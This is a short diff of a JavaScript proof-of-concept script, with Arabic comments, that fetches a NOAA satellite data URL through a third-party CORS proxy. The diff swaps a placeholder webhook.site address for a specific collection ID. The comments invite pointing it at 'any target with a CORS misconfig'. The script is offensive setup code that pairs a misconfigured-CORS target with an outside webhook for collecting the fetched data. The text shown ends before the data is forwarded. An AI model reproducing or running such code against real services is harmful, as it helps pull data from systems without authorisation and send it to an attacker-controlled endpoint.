@@ -1,7 +1,7 @@
 <script>
 const proxy = "https://nasa-cors-proxy-poc-vuc3.vercel.app/api/fetch";
 const target = "https://data.goes.noaa.gov/data/pub/satellite_data.json"; // أو أي هدف به CORS misconfig
-const webhook = "https://webhook.site/your-id"; // عدّله حسب حسابك
+const webhook = "https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de"; // عدّله حسب حسابك
 
 console.log("🔍 PoC script started...");
 fetch(`${proxy}?url=${encodeURIComponent(target)}`, { credentials: "omit" })
